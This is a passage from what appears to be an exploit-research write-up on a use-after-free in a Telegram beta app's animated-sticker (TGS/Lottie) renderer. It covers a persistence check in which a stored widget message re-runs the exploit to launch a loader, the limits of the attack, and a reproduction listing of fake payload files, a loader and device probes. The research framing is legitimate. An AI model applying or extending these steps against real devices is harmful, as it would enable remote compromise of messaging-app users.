expected to produce the ordinary crash (the free-during-render path) but not
the fake `comp` (the pre-render window + reclaim). Do not interpret a crash as
a controlled primitive.

### 5.7 Persistence / update check

```sh
# app-UID shell: kill the app; the C2 process dies with the cgroup
kill -9 $(pidof org.telegram.messenger.beta)
# open the widget chat again (the message is durable) → the widget re-runs the
# first exploit → system() → the loader; check loader_proof.txt's pid is new
```

An app update forces the same kill; the app-data `.so` and the widget message
survive. The loader is re-deployed, not auto-started. Record whether the
`libtmessages.49loc.so` name is bumped by the update (it breaks `.49loc`).

---

## 6. Limits and what would change the verdict

* **Host vs device**: the render/race numbers are x86_64 host measurements;
  the *ratio* (pre-render window vs 16.7 ms period) is the transferable part.
  The real JNI prologue is ~1-5 µs; the device plan measures the *gate* values,
  not the window directly.
* **Scudo configuration** on the Sony is unverified; the quarantine decides
  whether a reclaim is 217 allocations or the next one. It does not change the
  transient-increment result.
* **A non-returning fake render** (an infinite loop with a valid composition)
  would keep the `+1` alive; constructing it requires a valid composition at
  the same address as the target, which is the contradiction in §2.3.
* **A full-write primitive from the walker** (e.g. a crafted `Vec` length used
  by a later `memcpy`) is the only untested direction that could turn the UAF
  into a real write. It was not attempted; the walker copy is 0x260 bytes of
  attacker data and is the right next target if someone wants to continue.
* **A dumpable app** (debuggable + JDWP) re-opens route 2 on that build; it
  would still not survive a restart.
* **A leak at cold start** in the TGS path (none exists today: the path
  returns pixels and a frame index) would be needed to make route 1 a cold-start
  chain; even then the increment is transient.

---

## 7. Reproduction

```
lab/loader_tgs_native/
  src/uaf_fake_render.cpp     fake-instance render: balance / arbitrary /
                              arbitrary-ro / validcomp / static / repeat
  src/race_window_model.cpp   the lifecycle model + pre-render-free counter
  src/loader_proof.c          raw-syscall ET_DYN, init_array + _start
  src/device_probe.c          ptrace/proc/process_vm_readv probe (raw syscalls)
  src/java/Loader.java        app_process + System.load test class
  src/gen_fake_tgs.py         fake TLottieInstance inside a gzip TGS
  src/tgs_common.h            gzip/raw read (same as lottie.cpp)
  pocs/fake_dead.tgs          comp = 0xdead0000 (the leak-free fault oracle)
  pocs/fake_leak.tgs          comp = 0x7f1234567890 (a plausible arm64 address)
  out/arm64/, out/amd64/      built payloads (loader_proof, device_probe)
  out/Loader.jar              d8 dex for the app_process test
  device/host_push.sh         adb push to /data/local/tmp
  device/device_run.sh        the app-UID test script (§5.1-5.5)
  logs/                       every number quoted above
  evidence/policy.txt         sepolicy/bionic/ART/zygote excerpts with lines
  evidence/ida_js_mf.txt      the js_free_rt tail call and the mf offsets
```

Host:

```sh
cd lab/loader_tgs_native
./run_all.sh          # needs /tmp/opencode/tlottie-uaf/target/release-nostd/libtlottie.a
```

Device: §5. No host command in this note requires a phone; the device commands
are for the caller.
